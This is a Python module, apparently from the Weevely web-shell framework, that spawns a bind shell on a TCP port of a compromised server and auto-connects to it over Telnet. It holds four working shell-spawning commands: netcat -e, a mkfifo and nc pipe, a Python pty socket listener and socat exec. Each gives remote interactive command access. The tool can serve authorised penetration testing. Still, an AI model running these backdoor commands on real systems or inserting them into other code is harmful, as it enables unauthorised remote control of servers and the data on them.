from core.vectors import PhpCode, ShellCmd, ModuleExec, Os
from core.module import Module
from core.loggers import log
from core import messages
import urllib.parse
import telnetlib
import time

class Tcp(Module):

    """Spawn a shell on a TCP port."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            ShellCmd(
              "nc -l -p ${port} -e ${shell}",
              name = 'netcat',
              target = Os.NIX,
              background = True
              ),
            ShellCmd(
              "rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc -l ${port} >/tmp/f; rm -rf /tmp/f",
              name = 'netcat_bsd',
              target = Os.NIX,
              background = True
              ),
              ShellCmd(
                """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", ${port}));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("${shell}");s.close()';""",
                name = 'python_pty',
                target = Os.NIX,
                background = True
              ),
              ShellCmd(
                """socat tcp-l:${port} exec:${shell}""",
                name = 'socat',
                target = Os.NIX,
                background = True
              )
            ]
        )

        self.register_arguments([
          { 'name' : 'port', 'help' : 'Port to spawn', 'type' : int },
          { 'name' : '-shell', 'help' : 'Specify shell', 'default' : '/bin/sh' },
          { 'name' : '-no-autoconnect', 'help' : 'Skip autoconnect', 'action' : 'store_true', 'default' : False },
          { 'name' : '-vector', 'choices' : self.vectors.get_names() }
        ])

    def run(self):

        # Run all the vectors
        for vector in self.vectors:

            # Skip vector if -vector is specified but does not match
            if self.args.get('vector') and self.args.get('vector') != vector.name:
                continue

            # Background run does not return results
            vector.run(self.args)

            # If set, skip autoconnect
            if self.args.get('no_autoconnect'): continue

            # Give some time to spawn the shell
            time.sleep(1)

            urlparsed = urllib.parse.urlparse(self.session['url'])

            if not urlparsed.hostname:
                log.debug(
                    messages.module_backdoor_tcp.error_parsing_connect_s % self.args['port']
                )
                continue

            try:
                telnetlib.Telnet(urlparsed.hostname, self.args['port'], timeout = 5).interact()

                # If telnetlib does not rise an exception, we can assume that
                # ended correctly and return from `run()`
                return
            except Exception as e:
                log.debug(
                    messages.module_backdoor_tcp.error_connecting_to_s_s_s % (
                        urlparsed.hostname,
                        self.args['port'],
                        e
                    )
                )

        # If autoconnect was expected but Telnet() calls worked,
        # prints error message
        if not self.args.get('no_autoconnect'):
            log.warn(
                messages.module_backdoor_tcp.error_connecting_to_s_s_s % (
                    urlparsed.hostname,
                    self.args['port'],
                    'remote port not open or unreachable'
                )
            )
